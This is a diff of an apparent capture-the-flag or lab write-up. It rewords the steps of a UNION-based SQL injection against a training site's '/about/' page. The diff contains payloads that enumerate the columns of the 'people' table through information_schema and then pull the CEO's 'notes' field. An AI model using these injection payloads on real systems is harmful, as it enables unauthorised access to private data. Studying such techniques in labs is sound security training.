@@ -103,19 +103,28 @@
  About | id None
 </title>
 ```
-* We have successfully pulled the first column name out of the database, but we now have a problem.
-* The page is only displaying the first matching item — we need to see all of the matching items.
-* Fortunately, we can use our SQLi to group the results. We can still only retrieve one result at a time, but by using the group_concat() function, we can amalgamate all of the column names into a single output:
+* First column name has been successfully pulled out of the database.
+* However, the page is only displaying the first matching item not all of the matching items.
+* Leverage the SQLi vulnerability to group the results.
+  * Can still only retrieve one result at a time, but by using the `group_concat()` function all of the column names can be amalgamated into a single output:
 ```
 /about/-1 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
 ```
-* We have successfully identified eight columns in this table: id, firstName, lastName, pfpLink, role, shortRole, bio, and notes.
-* Considering our task, it seems a safe bet that our target column is notes.
-* Finally, we are ready to take the flag from this database — we have all of the information that we need:
-* The name of the table: people.
-* The name of the target column: notes.
-* The ID of the CEO is 1; this can be found simply by clicking on Jameson Wolfe's profile on the /about/ page and checking the ID in the URL.
-* Let's craft a query to extract this flag:
+* Page title now shows eight columns in this table:
+```
+<title>
+ About |
+ id,firstName,lastName,pfpLink,role,shor
+ tRole,bio,notes None
+</title>
+```
+* Considering the task, it seems a safe bet that the target column is `notes`.
+* All of the information to complete the task has now been found:
+  * The name of the table: `people`.
+  * The name of the target column: `notes`.
+  * The `ID` of the CEO is 1.
+    * This can be found simply by clicking on Jameson Wolfe's profile on the `/about/` page and checking the `ID` in the URL.
+* Craft a query to extract the CEO's notes:
 ```
 -1 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
-``
+```
